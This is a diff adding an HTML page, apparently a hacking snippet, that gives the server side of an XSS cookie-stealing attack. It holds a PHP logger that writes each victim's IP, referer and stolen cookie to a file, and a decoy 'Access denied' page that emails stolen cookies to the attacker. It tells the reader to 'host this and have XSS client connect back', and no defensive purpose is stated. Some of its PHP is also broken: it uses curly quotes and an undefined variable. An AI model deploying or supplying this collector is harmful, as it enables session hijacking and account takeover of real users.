@@ -1,0 +1,36 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>php emailer</title>
+</head><body>Host this and have XSS client connect back<br/>
+<br/>
+&lt;?php<br/>
+$f = fopen(“log.txt”, “a”);<br/>
+fwrite($f, “IP: {$_SERVER[‘REMOTE_ADDR’]} Ref: {$_SERVER<br/>
+[‘HTTP_REFERER’]} Cookie: {$HTTP_GET_VARS[‘c’]}\n”);<br/>
+fclose($f);<br/>
+?&gt;<br/>
+<br/>
+Open notepad and make a page: <b>cookie.php</b><br/>
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;<br/>
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;<br/>
+&lt;head&gt;<br/>
+&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /&gt;<br/>
+&lt;title&gt;Error&lt;/title&gt;<br/>
+&lt;style type="text/css"&gt;<br/>
+&lt;!--<br/>
+body,td,th {<br/>
+color: #FFFFFF;<br/>
+}<br/>
+body {<br/>
+background-color: #000000;<br/>
+}<br/>
+--&gt;<br/>
+&lt;/style&gt;&lt;/head&gt;<br/>
+&lt;? mail('email@example.com', 'Cookie stealed ! - thx xyli :)', $cookies); ?&gt; <br/>
+&lt;body&gt;<br/>
+&lt;h2&gt;&lt;strong&gt;Error&lt;/strong&gt; - &lt;strong&gt;Access denied&lt;/strong&gt; for &lt;? echo $_SERVER["REMOTE_ADDR"]; ?&gt;&lt;/h2&gt;<br/>
+&lt;/body&gt;<br/>
+&lt;/html&gt;<br/>
+</body></html>
